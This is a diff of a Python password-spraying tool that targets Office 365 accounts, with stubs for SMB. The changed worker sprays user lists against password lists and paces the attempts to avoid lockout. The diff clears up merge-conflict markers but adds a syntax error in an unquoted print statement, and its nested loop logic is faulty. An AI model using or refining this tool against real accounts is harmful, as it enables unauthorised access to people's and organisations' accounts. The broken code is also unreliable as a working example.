@@ -15,6 +15,7 @@ from time import sleep
 from selenium import webdriver
 from selenium.webdriver.common.keys import Keys
 from selenium.webdriver.chrome.options import Options
+import io
 
 init()
 
@@ -99,9 +100,6 @@ def check_o365(username):
         "Global Office365": ".mail.protection.outlook.com",
         "other convention for Office365": ".mail.protection." + username
     }
-
-<<<<<<< HEAD
-=======
     for line in url_dict:
         try:
             socket.gethostbyname(domain + url_dict[line])
@@ -121,69 +119,57 @@ def check_o365(username):
         except:
             pass
 
->>>>>>> 929b8922ac56b87917015670062fbf638550e2e0
 def hybrid_office_worker(policy,user,_pass):
     attempts = 1
     max_attempts, timelimit = tuple(policy.split(','))
     timelimit = 60*int(timelimit)
     max_attempts = int(max_attempts) - 1
     
-    if isinstance(user, str):
+    if isinstance(user, str)and isinstance(_pass, io.TextIOWrapper):
         #this shows we are spraying a single username against a passfile
         try:
-            with open(_pass,'r') as passfile:
-                for password in passfile.readlines():
-                    #This is where we will apply our password policy
-                    if attempts == max_attempts:
-                        sleep(timelimit)
-                        attempts = 1
-                    brute_office(user,password.strip("\n"))
-                    attempts = attempts + 1
-                    sleep(timelimit//max_attempts)
+            for password in _pass.readlines():
+                #This is where we will apply our password policy
+                if attempts == max_attempts:
+                    sleep(timelimit)
+                    attempts = 1
+                brute_office(user,password.strip("\n"))
+                attempts = attempts + 1
+                sleep(timelimit//max_attempts)
         except Exception as e:
             print(e)
-            
-            
-    elif isinstance(_pass, str):
+                     
+    elif isinstance(_pass, str) and isinstance(user, io.TextIOWrapper):
         #this shows we are spraying a single password against a userfile
         try:
-            with open(user,'r') as userfile:
-                for username in userfile.readlines():
-                    #This is where we will apply our password policy
+            for username in user.readlines():
+                #This is where we will apply our password policy
+                if attempts == max_attempts:
+                    sleep(timelimit)
+                    attempts = 1
+                brute_office(username.strip("\n"),_pass)
+                attempts = attempts + 1
+                sleep(timelimit//max_attempts)
+        except Exception as e:
+            print(e)
+            
+    elif isinstance(user, io.TextIOWrapper) and isinstance(_pass, io.TextIOWrapper):
+        #this means we are spraying userfile against passfile.
+        try: 
+            for password in _pass.readlines():
+                for username in user.readlines():
                     if attempts == max_attempts:
                         sleep(timelimit)
                         attempts = 1
-                    brute_office(username.strip("\n"),_pass)
+                    brute_office(username.strip("\n"),password.strip("\n"))
                     attempts = attempts + 1
                     sleep(timelimit//max_attempts)
         except Exception as e:
             print(e)
-            
-    elif isinstance(user, str) and isinstance(_pass, str):
-        #this means we are spraying userfile against passfile.
-        try:
-            with open(_pass, 'r') as passfile, open(user,'r') as userfile:
-                for password in passfile.readlines():
-                    for username in userfile.redlines():
-                        if attempts == max_attempts:
-                            sleep(timelimit)
-                            attempts = 1
-<<<<<<< HEAD
-                        
-=======
-                        #we can try to use threading here
->>>>>>> 929b8922ac56b87917015670062fbf638550e2e0
-                        brute_office(username.strip("\n"),password.strip("\n"))
-                        attempts = attempts + 1
-                        sleep(timelimit//max_attempts)
-        except Exception as e:
-            print(e)
-<<<<<<< HEAD
             exit(0)
-=======
+            
     else:
-        print("[!]Unknown mode selected. Check the usage")
->>>>>>> 929b8922ac56b87917015670062fbf638550e2e0
+        print("[!]Unknown inputs. Check the usage")
 
 def hybrid_smb_worker(policy,username="",password="",userfile="",passfile=""):
     #TODO: Run hybrid bruteforcing here using worker threads
@@ -224,11 +210,17 @@ if __name__ == '__main__':
             brute_office(username,password)
         else:
             if username and passfile:
+                passfile = open(passfile,'r')
                 hybrid_office_worker(policy,username,passfile)
             elif userfile and password:
+                userfile = open(userfile,'r')
                 hybrid_office_worker(policy,userfile,password)
             elif userfile and passfile:
+                passfile = open(passfile,'r')
+                userfile = open(userfile,'r')
                 hybrid_office_worker(policy,userfile,passfile)
+            else:
+                print([+]Unknow error! Check usage)
 
     # Run smb spraying test   
     if mode == "smb":
